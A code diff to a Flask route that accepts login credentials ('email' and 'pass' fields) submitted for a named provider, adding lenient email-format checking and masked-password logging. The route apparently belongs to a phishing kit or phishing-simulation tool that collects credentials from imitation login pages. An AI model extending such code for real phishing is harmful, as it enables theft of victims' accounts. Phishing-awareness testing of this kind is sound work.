@@ -204,14 +204,33 @@ def submit_provider(provider):
         logger.warning(f"Invalid provider in submission URL: '{provider}'", extra=log_extras)
         abort(404)
 
-    username = request.form.get('email') # Assumes 'email' field for username
+    username = request.form.get('email') # Assumes 'email' field for username/email/phone
     password = request.form.get('pass')  # Assumes 'pass' field for password
 
     # Basic validation
     if not username or not password:
         logger.warning("Missing username or password in submission", extra=log_extras)
-        # Consider returning an error message to the user
         return "<h3>Missing username or password. Please go back and try again.</h3>", 400
+
+    # --- Email Format Validation ---
+    # Simple check if the username field contains '@' if it's likely intended as an email
+    # More robust validation could use regex or a library if needed
+    # This check assumes the 'email' field might contain username, phone, or email
+    # We only enforce '@' if it looks like an email attempt that failed basic HTML validation
+    if '@' not in username and username.count('.') > 0: # Heuristic: if it has dots but no @, it might be a mistyped email
+         # Check if the field name itself suggests email
+         is_likely_email_field = 'email' in request.form # Check if the key is literally 'email'
+
+         # More specific check: only reject if it looks like an email but lacks '@'
+         # This avoids rejecting valid usernames or phone numbers entered in the field.
+         # A better approach might be separate fields or clearer instructions on the form.
+         # For now, we'll log a warning but allow it, relying on client-side type="email" mostly.
+         logger.debug(f"Submitted username field '{username}' does not contain '@'. Allowing submission but noting potential non-email format.", extra=log_extras)
+         # If strict validation is desired, uncomment the following:
+         # logger.warning(f"Invalid email format submitted: missing '@'. Username: {username}", extra=log_extras)
+         # return "<h3>Invalid email format. Please ensure you enter a valid email address.</h3>", 400
+    # --- End Email Validation ---
+
 
     # Log submission attempt - MASK PASSWORD
     masked_password = '*' * len(password) if password else ''
